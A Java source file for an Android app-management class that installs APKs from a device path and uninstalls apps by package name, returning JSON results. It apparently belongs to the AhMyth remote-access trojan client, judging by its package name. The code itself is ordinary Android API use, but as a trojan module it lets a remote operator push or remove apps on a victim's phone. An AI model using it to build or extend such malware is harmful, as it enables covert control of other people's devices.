package ahmyth.mine.king.ahmyth;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import org.json.JSONObject;
import org.json.JSONException;

/**
 * AppManager - Handles app installation and uninstallation
 */
public class AppManager {
    private static final String TAG = "AppManager";
    private Context context;
    
    public AppManager(Context context) {
        this.context = context;
    }
    
    /**
     * Install an APK file
     * @param apkPath Path to the APK file on the device
     * @return JSONObject with result
     */
    public JSONObject installApp(String apkPath) {
        JSONObject result = new JSONObject();
        try {
            File apkFile = new File(apkPath);
            
            if (!apkFile.exists()) {
                result.put("success", false);
                result.put("error", "APK file not found: " + apkPath);
                return result;
            }
            
            // Check if we have INSTALL_PACKAGES permission (requires root or system app)
            // For non-root devices, we'll use package installer intent
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Use package installer for Android 7+
                installViaPackageInstaller(apkFile);
            } else {
                // Use install intent for older versions
                installViaIntent(apkFile);
            }
            
            result.put("success", true);
            result.put("message", "Installation initiated for: " + apkFile.getName());
            
        } catch (Exception e) {
            Log.e(TAG, "Error installing app", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException je) {
                Log.e(TAG, "Error creating JSON result", je);
            }
        }
        return result;
    }
    
    private void installViaIntent(File apkFile) {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        context.startActivity(intent);
    }
    
    private void installViaPackageInstaller(File apkFile) {
        try {
            PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            );
            
            int sessionId = packageInstaller.createSession(params);
            PackageInstaller.Session session = packageInstaller.openSession(sessionId);
            
            // Copy APK to session
            InputStream in = new FileInputStream(apkFile);
            OutputStream out = session.openWrite("app", 0, apkFile.length());
            
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            
            session.fsync(out);
            in.close();
            out.close();
            
            // Commit the session
            Intent intent = new Intent(context, AppInstallReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            session.commit(pendingIntent.getIntentSender());
            session.close();
            
        } catch (Exception e) {
            Log.e(TAG, "PackageInstaller failed, falling back to intent", e);
            // Fallback to intent method
            installViaIntent(apkFile);
        }
    }
    
    /**
     * Uninstall an app by package name
     * @param packageName Package name of the app to uninstall
     * @return JSONObject with result
     */
    public JSONObject uninstallApp(String packageName) {
        JSONObject result = new JSONObject();
        try {
            // Check if package exists
            PackageManager pm = context.getPackageManager();
            try {
                pm.getPackageInfo(packageName, 0);
            } catch (PackageManager.NameNotFoundException e) {
                result.put("success", false);
                result.put("error", "Package not found: " + packageName);
                return result;
            }
            
            // For non-root devices, we'll use uninstall intent
            // This requires user interaction
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            
            result.put("success", true);
            result.put("message", "Uninstallation initiated for: " + packageName);
            
        } catch (Exception e) {
            Log.e(TAG, "Error uninstalling app", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException je) {
                Log.e(TAG, "Error creating JSON result", je);
            }
        }
        return result;
    }
}

